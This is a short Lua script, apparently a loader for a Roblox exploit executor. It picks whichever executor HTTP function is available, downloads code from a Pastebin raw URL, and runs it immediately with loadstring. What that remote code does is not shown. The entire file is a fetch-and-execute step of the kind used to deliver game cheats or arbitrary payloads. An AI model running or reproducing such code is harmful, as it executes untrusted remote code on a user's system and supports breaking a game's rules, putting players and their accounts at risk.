local function gethttp(src)
	if validfgwindow then
		return httpget(src, game.PlaceId)
	elseif HttpGet then
		return HttpGet(src)
	else
		return game:HttpGet(src, true)
	end
end

loadstring(gethttp("https://pastebin.com/raw/NVd03kmV"))()